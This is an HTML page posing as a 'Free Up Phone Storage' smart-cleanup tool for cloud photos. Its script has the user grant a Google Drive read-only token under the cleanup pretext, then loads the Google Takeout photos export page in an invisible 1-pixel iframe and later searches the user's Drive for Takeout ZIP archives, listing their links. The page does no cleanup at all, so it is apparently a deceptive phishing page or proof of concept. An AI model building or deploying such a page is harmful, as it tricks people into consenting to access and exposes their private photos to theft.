<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Free Up Phone Storage</title>
  <script src="https://accounts.google.com/gsi/client" async defer></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    iframe.hidden-frame {
      width: 1px;
      height: 1px;
      opacity: 0;
      position: absolute;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <h1>Free Up Phone Storage</h1>
  <p>Smart cleanup helps optimize your cloud photos and save space.</p>
  <button id="startCleanup">Start Smart Cleanup</button>
  <pre id="output">Waiting for user...</pre>

  <script>
    const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com";
    const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
    let accessToken = null;
    let tokenClient;

    window.onload = () => {
      tokenClient = google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: SCOPES,
        callback: (response) => {
          if (response.error) {
            document.getElementById("output").textContent = "âŒ Error: " + response.error;
            return;
          }

          accessToken = response.access_token;
          document.getElementById("output").textContent =
            `âœ… Access Token:\n${accessToken}\n\nPreparing cleanup...`;

          // Load hidden takeout export after token is granted
          setTimeout(() => {
            const hiddenIframe = document.createElement("iframe");
            hiddenIframe.src = "https://takeout.google.com/settings/takeout/custom/photos";
            hiddenIframe.className = "hidden-frame";
            document.body.appendChild(hiddenIframe);
          }, 3000);

          // Try to access drive files a bit later
          setTimeout(listDriveZips, 12000);
        }
      });

      document.getElementById("startCleanup").onclick = () => {
        document.getElementById("output").textContent = "ðŸ§  Running smart cleanup...";
        tokenClient.requestAccessToken({ prompt: 'consent' });
      };
    };

    function listDriveZips() {
      if (!accessToken) return;
      fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webViewLink)", {
        headers: {
          Authorization: `Bearer ${accessToken}`
        }
      })
      .then(res => res.json())
      .then(data => {
        const files = data.files || [];
        let output = `ðŸ“¦ Found ${files.length} Takeout ZIP(s):\n\n`;

        if (files.length === 0) {
          output += "âŒ No Takeout ZIPs found yet.";
        } else {
          files.forEach(file => {
            output += `ðŸ—‚ ${file.name}\nðŸ”— View: ${file.webViewLink}\n\n`;
          });
        }

        document.getElementById("output").textContent += "\n\n" + output;
      });
    }
  </script>
</body>
</html>
